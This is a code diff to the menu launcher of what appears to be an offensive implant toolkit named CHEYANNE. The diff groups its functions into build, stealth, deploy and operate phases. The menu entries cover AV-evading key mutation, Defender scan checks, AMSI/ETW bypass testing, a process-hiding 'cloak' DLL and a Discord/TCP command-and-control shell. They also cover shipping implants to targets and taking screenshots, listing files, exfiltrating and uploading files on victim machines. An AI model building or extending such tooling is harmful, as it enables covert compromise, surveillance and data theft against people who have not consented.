@@ -76,6 +76,13 @@ TOOLS = [
     ("P", "DEPLOY",      "Build + scan + deploy",            "deploy.py"),
 ]
 
+try:
+    from cheyanne_ops import (op_sessions, op_screenshot, op_browse,
+                               op_exfil, op_upload, op_recon)
+    HAS_OPS = True
+except ImportError:
+    HAS_OPS = False
+
 
 def check_built(rel_path):
     return os.path.exists(os.path.join(ROOT, rel_path))
@@ -183,33 +190,81 @@ def render():
         dot = f"{GREEN}●{RST}" if built else f"{RED}○{RST}"
         print(f"  {dot}  {BLUE}[{key}]{RST}  {WHITE}{name:<14s}{RST} {DIM}{desc:<30s}{RST}")
 
-    # quick actions
+    # ── PHASE 1: BUILD ──
     print()
     print(hline("═"))
-    print(f"  {AMBER}{BOLD}  OPERATIONS{RST}")
-    print(hline("═"))
-    print()
-    ops = [
-        ("1", "Compile All",         "Build every component",           AMBER),
-        ("2", "Scan All",            "Defender scan all binaries",      RED),
-        ("3", "Dark Room Test",      "Runtime AMSI+ETW bypass verify",  GREEN),
-        ("4", "Mutate All",          "Rotate XOR keys + recompile",     PINK),
-        ("F", "FRESH BUILD",         "Auto-mutate + auto-IP + compile",  PINK),
-        ("5", "Pentest",             "Full automated pentest chain",     RED),
-        ("6", "Key Status",          "Show current XOR keys",           AMBER),
-        ("7", "Build Cloak",         "Compile cloak.dll + loader",      WHITE),
-        ("8", "Test Cloak",          "Verify process hiding works",     WHITE),
-        ("9", "Activate Cloak",      "System-wide concealment ON",      RED),
-        ("G", "Ghost Payload",       "Generate steganographic chain",   CYAN),
-        ("W", "Web Dashboard",       "Launch browser C2 UI",            BLUE),
-        ("A", "Agent (local)",       "Run agent connecting to localhost",GREEN),
-        ("D", "C2 SHELL",            "TCP shell + Discord beacon",       GREEN),
-        ("B", "Build Implant",      "Sync token → rebuild → serve",    CYAN),
-        ("X", "Convert Image",      "BMP/PNG/JPG auto-convert",        WHITE),
-        ("0", "Exit",                "",                                DIM),
+    print(f"  {PINK}{BOLD}  PHASE 1 — BUILD{RST}")
+    print(hline("─"))
+    build_ops = [
+        ("F", "Fresh Build",    "Mutate + auto-IP + compile + scan", PINK),
+        ("1", "Compile Only",   "Build without mutation",            AMBER),
+        ("2", "Scan All",       "Defender check all binaries",       RED),
+        ("4", "Mutate Keys",    "Rotate XOR keys + recompile",      AMBER),
+        ("6", "Key Status",     "Show current mutation keys",        AMBER),
     ]
-    for key, name, desc, color in ops:
-        print(f"  {color}  [{key}]{RST}  {WHITE}{name:<20s}{RST} {DIM}{desc}{RST}")
+    for key, name, desc, color in build_ops:
+        print(f"  {color}  [{key}]{RST}  {WHITE}{name:<18s}{RST} {DIM}{desc}{RST}")
+
+    # ── PHASE 2: STEALTH ──
+    print()
+    print(hline("═"))
+    print(f"  {GREEN}{BOLD}  PHASE 2 — STEALTH{RST}")
+    print(hline("─"))
+    stealth_ops = [
+        ("3", "Dark Room",      "AMSI + ETW bypass test",            GREEN),
+        ("7", "Build Cloak",    "Compile cloak.dll + loader",        WHITE),
+        ("8", "Test Cloak",     "Verify process/port hiding",        WHITE),
+        ("9", "Activate Cloak", "System-wide concealment ON",        RED),
+    ]
+    for key, name, desc, color in stealth_ops:
+        print(f"  {color}  [{key}]{RST}  {WHITE}{name:<18s}{RST} {DIM}{desc}{RST}")
+
+    # ── PHASE 3: DEPLOY ──
+    print()
+    print(hline("═"))
+    print(f"  {RED}{BOLD}  PHASE 3 — DEPLOY{RST}")
+    print(hline("─"))
+    deploy_ops = [
+        ("D", "C2 Shell",       "TCP listener + Discord poller",     GREEN),
+        ("B", "Build Implant",  "Sync token + rebuild + serve",      CYAN),
+        ("A", "Auto Deploy",    "Compile + ship implant to target",  RED),
+    ]
+    for key, name, desc, color in deploy_ops:
+        print(f"  {color}  [{key}]{RST}  {WHITE}{name:<18s}{RST} {DIM}{desc}{RST}")
+
+    # ── PHASE 4: OPERATE ──
+    print()
+    print(hline("═"))
+    print(f"  {CYAN}{BOLD}  PHASE 4 — OPERATE{RST}  {DIM}(Discord implant commands){RST}")
+    print(hline("─"))
+    ops_color = CYAN if HAS_OPS else DIM
+    operate_ops = [
+        ("S", "Sessions",       "List active targets",               ops_color),
+        ("T", "Screenshot",     "Capture + download target screen",  ops_color),
+        ("L", "Browse Files",   "List target filesystem",            ops_color),
+        ("E", "Exfil File",     "Pull file from target → local",    ops_color),
+        ("U", "Upload File",    "Push file to target",               ops_color),
+        ("N", "Recon",          "Full target enumeration",           ops_color),
+    ]
+    for key, name, desc, color in operate_ops:
+        print(f"  {color}  [{key}]{RST}  {WHITE}{name:<18s}{RST} {DIM}{desc}{RST}")
+    if not HAS_OPS:
+        print(f"  {RED}  [!] cheyanne_ops.py not found — OPERATE disabled{RST}")
+
+    # ── TOOLKIT ──
+    print()
+    print(hline("═"))
+    print(f"  {BLUE}{BOLD}  TOOLKIT{RST}")
+    print(hline("─"))
+    toolkit_ops = [
+        ("G", "Ghost Encode",   "Steganographic payload",            CYAN),
+        ("5", "Pentest Chain",  "Full automated kill chain",         RED),
+        ("W", "Web Dashboard",  "Browser C2 UI",                     BLUE),
+        ("X", "Convert Image",  "BMP/PNG/JPG auto-convert",         WHITE),
+        ("0", "Exit",           "",                                  DIM),
+    ]
+    for key, name, desc, color in toolkit_ops:
+        print(f"  {color}  [{key}]{RST}  {WHITE}{name:<18s}{RST} {DIM}{desc}{RST}")
 
     print()
     print(hline())
@@ -489,10 +544,6 @@ def run_op(choice):
         import time
         time.sleep(1)
         webbrowser.open("http://127.0.0.1:8666")
-    elif choice.lower() == "a":
-        agent_script = os.path.join(ROOT, "vader_agent.py")
-        print(f"\n  {GREEN}[*] Launching local agent → 127.0.0.1:8667{RST}")
-        subprocess.run([sys.executable, agent_script, "127.0.0.1", "--reconnect"], cwd=ROOT)
     elif choice.lower() == "d":
         c2_v2 = os.path.join(ROOT, "shell", "vader_c2_v2.py")
         print(f"\n  {GREEN}[*] Launching CHEYANNE C2 — Dual Channel (TCP + Discord){RST}")
@@ -500,8 +551,31 @@ def run_op(choice):
     elif choice.lower() == "b":
         print(f"\n  {CYAN}[*] Discord Implant — Full Deploy Pipeline{RST}")
         subprocess.run([sys.executable, os.path.join(ROOT, "deploy.py"), "--implant-deploy"])
+    elif choice.lower() == "a" and choice == "A":
+        auto_test = os.path.join(ROOT, "auto_screenshot_test.py")
+        if os.path.exists(auto_test):
+            subprocess.run([sys.executable, auto_test], cwd=ROOT)
+        else:
+            print(f"\n  {RED}[!] auto_screenshot_test.py not found{RST}")
     elif choice.lower() == "x":
         convert_image()
+
+    # ── PHASE 4: OPERATE ──
+    elif choice.lower() == "s" and HAS_OPS:
+        op_sessions()
+    elif choice.lower() == "t" and HAS_OPS:
+        op_screenshot()
+    elif choice.lower() == "l" and HAS_OPS:
+        op_browse()
+    elif choice.lower() == "e" and HAS_OPS:
+        op_exfil()
+    elif choice.lower() == "u" and HAS_OPS:
+        op_upload()
+    elif choice.lower() == "n" and HAS_OPS:
+        op_recon()
+    elif choice.lower() in ("s", "t", "l", "e", "u", "n") and not HAS_OPS:
+        print(f"\n  {RED}[!] cheyanne_ops.py not loaded — OPERATE commands unavailable{RST}")
+
     else:
         return False
 
